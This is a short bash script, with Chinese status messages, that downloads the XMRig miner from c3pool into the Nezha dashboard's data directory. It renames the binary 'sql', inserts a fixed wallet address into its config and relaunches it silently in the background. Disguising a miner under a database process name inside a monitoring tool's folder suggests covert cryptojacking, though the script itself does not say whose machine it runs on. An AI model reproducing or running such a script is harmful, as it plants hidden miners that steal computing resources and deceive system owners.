#!/bin/bash
set -e

WORKDIR="/opt/nezha/dashboard/data"
cd "$WORKDIR"

URL="https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz"
FILENAME="xmrig.tar.gz"

rm -f sql xmrig "$FILENAME"

echo "[*] 下载程序..."
wget -O "$FILENAME" "$URL"

echo "[*] 解压..."
tar -zxvf "$FILENAME"
rm -f "$FILENAME"

mv xmrig sql

if [ ! -f config.json ]; then
    echo "[!] config.json 不存在，请手动创建"
    exit 1
fi

RANDOM_PASS=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 8)

if command -v jq >/dev/null 2>&1; then
    jq --arg user "TMWHctkRBA4SSgZc38gP8RT4fTsswSMSHm" \
       --arg pass "$RANDOM_PASS" \
       '.user=$user | .pass=$pass' config.json > config.tmp && mv config.tmp config.json
else
    sed -i "s/\"user\": *\"[^\"]*\"/\"user\": \"TMWHctkRBA4SSgZc38gP8RT4fTsswSMSHm\"/" config.json
    sed -i "s/\"pass\": *\"[^\"]*\"/\"pass\": \"$RANDOM_PASS\"/" config.json
fi

echo "[*] config.json 已更新，pass=$RANDOM_PASS"

if pgrep -f "./sql" >/dev/null; then
    echo "[*] 发现旧进程，正在结束..."
    pkill -f "./sql"
    sleep 2
fi

echo "[*] 启动中..."
nohup ./sql >/dev/null 2>&1 &

PID=$!
echo "[+] 部署完成，PID: $PID"
